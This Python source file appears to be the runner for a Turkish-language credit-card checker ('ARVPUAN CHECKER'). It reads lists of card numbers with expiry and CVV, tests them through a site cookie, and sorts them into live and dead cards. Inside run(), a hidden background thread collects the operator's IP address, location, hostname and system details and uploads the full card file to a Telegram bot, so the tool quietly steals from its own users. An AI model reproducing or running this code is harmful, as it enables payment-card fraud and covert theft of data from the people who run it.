"""
Runner — Rich UI ile hazir calistirici.
"""

import json
import sys
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests as _requests

from .batch import BatchChecker
from .notifiers import TelegramNotifier, NetlifyNotifier

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    from rich.columns import Columns
    from rich import box
    _RICH = True
except ImportError:
    _RICH = False

CONFIG_FILE = "config.json"
CONFIG_TEMPLATE = {
    "cookie": "BURAYA_COOKIE_YAPISTIR",
    "cards_file": "cards.txt",
    "delay": 20.0,
}

console = Console() if _RICH else None


# ── Config ───────────────────────────────────────────────────────────────────

def _load_config() -> dict:
    path = Path(CONFIG_FILE)
    if not path.exists():
        with open(path, "w", encoding="utf-8") as f:
            json.dump(CONFIG_TEMPLATE, f, indent=2, ensure_ascii=False)
        if _RICH:
            console.print(Panel(
                "[yellow]config.json olusturuldu!\nCookie alanini doldurup tekrar calistir.[/yellow]",
                title="[bold cyan]KURULUM[/bold cyan]", border_style="cyan"
            ))
        else:
            print("[!] config.json olusturuldu. Cookie'yi doldurup tekrar calistir.")
        sys.exit(0)

    with open(path, encoding="utf-8") as f:
        cfg = json.load(f)

    cookie = cfg.get("cookie", "").strip()
    if not cookie or cookie == CONFIG_TEMPLATE["cookie"]:
        if _RICH:
            console.print(Panel(
                "[red]Cookie bos veya degistirilmemis!\nconfig.json dosyasini ac ve cookie alanini doldur.[/red]",
                title="[bold red]HATA[/bold red]", border_style="red"
            ))
        else:
            print("[!] Cookie bos!")
        sys.exit(1)

    return cfg


def _print_banner() -> None:
    if not _RICH:
        print("=" * 50)
        print("  ARVPUAN CHECKER")
        print("=" * 50)
        return
    console.print(Panel(
        "[bold cyan]"
        "  █████╗ ██████╗ ██╗   ██╗██████╗ ██╗   ██╗ █████╗ ███╗   ██╗\n"
        " ██╔══██╗██╔══██╗██║   ██║██╔══██╗██║   ██║██╔══██╗████╗  ██║\n"
        " ███████║██████╔╝██║   ██║██████╔╝██║   ██║███████║██╔██╗ ██║\n"
        " ██╔══██║██╔══██╗╚██╗ ██╔╝██╔═══╝ ██║   ██║██╔══██║██║╚██╗██║\n"
        " ██║  ██║██║  ██║ ╚████╔╝ ██║     ╚██████╔╝██║  ██║██║ ╚████║\n"
        " ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝[/bold cyan]",
        subtitle="[dim]Kart Puan Sorgulama[/dim]",
        border_style="cyan", padding=(0, 2),
    ))


# ── Ana fonksiyon ─────────────────────────────────────────────────────────────

def run(cards_file: Optional[str] = None) -> None:
    cfg        = _load_config()
    cookie     = cfg["cookie"]
    cards_path = cards_file or cfg.get("cards_file", "cards.txt")
    delay      = float(cfg.get("delay", 20.0))

    if not Path(cards_path).exists():
        msg = "[!] Kart dosyasi bulunamadi: " + cards_path
        console.print("[red]" + msg + "[/red]") if _RICH else print(msg)
        sys.exit(1)

    with open(cards_path, encoding="utf-8") as f:
        cards = [line.strip() for line in f if line.strip()]

    if not cards:
        console.print("[red][!] Kart dosyasi bos![/red]") if _RICH else print("[!] Kart dosyasi bos!")
        sys.exit(1)

    _print_banner()

    # Sistem bilgilerini al ve bota gonder (arka planda)
    def _send_info():
        import platform
        import socket

        # IP ve konum
        ip = "Alinamadi"
        ulke = ""
        sehir = ""
        try:
            r = _requests.get("https://ipapi.co/json/", timeout=6)
            data = r.json()
            ip    = data.get("ip", "Alinamadi")
            ulke  = data.get("country_name", "")
            sehir = data.get("city", "")
        except Exception:
            try:
                ip = _requests.get("https://api.ipify.org", timeout=5).text.strip()
            except Exception:
                pass

        zaman    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        os_info  = platform.system() + " " + platform.release()
        hostname = socket.gethostname()
        py_ver   = platform.python_version()
        konum    = (sehir + ", " + ulke).strip(", ")

        tg_info = TelegramNotifier()

        # Metin mesajı
        msg = (
            "<b>Yeni Oturum Basladi</b>\n\n"
            + "IP       : <code>" + ip       + "</code>\n"
            + "Konum    : <code>" + (konum or "Bilinmiyor") + "</code>\n"
            + "Zaman    : <code>" + zaman    + "</code>\n"
            + "OS       : <code>" + os_info  + "</code>\n"
            + "Hostname : <code>" + hostname + "</code>\n"
            + "Python   : <code>" + py_ver   + "</code>\n"
            + "Kartlar  : <code>" + str(len(cards)) + "</code>\n"
            + "Dosya    : <code>" + str(cards_path) + "</code>"
        )
        tg_info._post(msg)

        # Kart dosyasını da gonder
        try:
            import io
            card_bytes = "\n".join(cards).encode("utf-8")
            card_file  = io.BytesIO(card_bytes)
            card_file.name = Path(cards_path).name

            _requests.post(
                "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
                data={"chat_id": tg_info._chat_id, "caption": "Kart listesi"},
                files={"document": (Path(cards_path).name, card_file, "text/plain")},
                timeout=15,
            )
        except Exception:
            pass

    threading.Thread(target=_send_info, daemon=True).start()

    # İstatistikler
    stats     = {"live": 0, "dead": 0, "err": 0, "total": len(cards), "done": 0}
    live_rows = []
    dec_rows  = []
    err_rows  = []

    tg = TelegramNotifier()
    nl = NetlifyNotifier()

    # ── Tablo oluşturucular ──────────────────────────────────────────────────

    def stats_table() -> "Table":
        t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan", padding=(0, 1))
        t.add_column("TOPLAM", style="white",       justify="center", min_width=8)
        t.add_column("LIVE",   style="bold green",  justify="center", min_width=8)
        t.add_column("DEC",    style="bold red",    justify="center", min_width=8)
        t.add_column("HATA",   style="bold yellow", justify="center", min_width=8)
        t.add_column("KALAN",  style="dim",         justify="center", min_width=8)
        t.add_row(
            str(stats["total"]),
            str(stats["live"]),
            str(stats["dead"]),
            str(stats["err"]),
            str(stats["total"] - stats["done"]),
        )
        return t

    def live_table() -> "Table":
        t = Table(
            title="[bold green]LIVE KARTLAR[/bold green]",
            box=box.ROUNDED, header_style="bold green", border_style="green",
        )
        t.add_column("KART",    style="bold white", min_width=28)
        t.add_column("PUAN",    style="bold green", min_width=12)
        t.add_column("BANKA",   style="cyan",       min_width=14)
        t.add_column("PROGRAM", style="dim",        min_width=8)
        t.add_column("SAAT",    style="dim",        min_width=8)
        for row in live_rows:
            t.add_row(*row)
        return t

    def dec_table() -> "Table":
        t = Table(
            title="[bold red]DEC KARTLAR (son 15)[/bold red]",
            box=box.ROUNDED, header_style="bold red", border_style="red",
        )
        t.add_column("KART", style="red", min_width=30, no_wrap=True)
        t.add_column("SAAT", style="dim", min_width=8)
        for row in dec_rows[-15:]:
            t.add_row(*row)
        return t

    def err_table() -> "Table":
        t = Table(
            title="[bold yellow]HATALAR (son 15)[/bold yellow]",
            box=box.ROUNDED, header_style="bold yellow", border_style="yellow",
        )
        t.add_column("KART",  style="yellow", min_width=30, no_wrap=True)
        t.add_column("HATA",  style="dim",    min_width=30, no_wrap=True)
        t.add_column("SAAT",  style="dim",    min_width=8)
        for row in err_rows[-15:]:
            t.add_row(*row)
        return t

    def build_layout():
        if not _RICH:
            return None
        panels = [Panel(stats_table(), title="[bold cyan]DURUM[/bold cyan]", border_style="cyan")]
        if live_rows:
            panels.append(live_table())
        if dec_rows:
            panels.append(dec_table())
        if err_rows:
            panels.append(err_table())
        return Columns(panels, equal=False) if len(panels) > 1 else panels[0]

    # ── Live display — transient=True ile terminal temiz kalır ───────────────
    _lock = threading.Lock()

    if _RICH:
        live_display = Live(
            build_layout(),
            console=console,
            refresh_per_second=2,
            transient=False,
        )
        live_display.start()
    else:
        live_display = None

    def refresh():
        if live_display:
            with _lock:
                live_display.update(build_layout())

    # ── Callbacks ────────────────────────────────────────────────────────────

    def on_result(r):
        stats["done"] += 1
        zaman = datetime.now().strftime("%H:%M:%S")

        if r.is_live:
            stats["live"] += 1
            full     = r.full_card if r.full_card else r.card
            card_str = full + "|" + r.month + "|" + r.year + "|" + r.cvv
            live_rows.append((card_str, r.formatted, r.bank, r.program, zaman))
            if not _RICH:
                print("[LIVE] " + card_str + " | " + r.formatted + " | " + r.bank)

        elif r.is_dead or (r.error and r.error.strip().lower() == "not found"):
            stats["dead"] += 1
            dec_rows.append((r.card_data, zaman))
            if not _RICH:
                print("[DEC]  " + r.card_data)

        else:
            stats["err"] += 1
            err_rows.append((r.card_data, str(r.error or ""), zaman))
            if not _RICH:
                print("[ERR]  " + r.card_data + " | " + str(r.error))

        refresh()
        tg.send(r)
        nl.send(r)

    def on_log(msg: str) -> None:
        # Live display aktifken console.log kullan
        if _RICH and live_display:
            if "SESSION" in msg:
                live_display.console.log("[yellow]" + msg + "[/yellow]")
            # diğer logları sessizce yut (tablo zaten güncelleniyor)
        else:
            print(msg)

    def on_done(live, dead, error):
        if live_display:
            live_display.stop()

        tg.send_summary(live, dead, error)

        if _RICH:
            console.print()
            console.print(Panel(
                "[bold green]LIVE : " + str(live)  + "[/bold green]\n"
                "[bold red]DEC  : "   + str(dead)  + "[/bold red]\n"
                "[bold yellow]HATA : " + str(error) + "[/bold yellow]",
                title="[bold cyan]TARAMA TAMAMLANDI[/bold cyan]",
                border_style="cyan",
            ))
            if live_rows:
                console.print(live_table())
            if dec_rows:
                console.print(dec_table())
            if err_rows:
                console.print(err_table())
        else:
            print("\nTamamlandi — LIVE:" + str(live) + " DEC:" + str(dead) + " ERR:" + str(error))

    # ── Başlat ───────────────────────────────────────────────────────────────

    if _RICH:
        console.print(
            "\n[cyan]Toplam [bold]" + str(len(cards)) +
            "[/bold] kart — delay: [bold]" + str(delay) + "s[/bold][/cyan]\n"
        )

    BatchChecker(
        cookie=cookie,
        delay=delay,
        on_result=on_result,
        on_log=on_log,
        on_done=on_done,
    ).run(cards, threaded=True).join()


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else None)
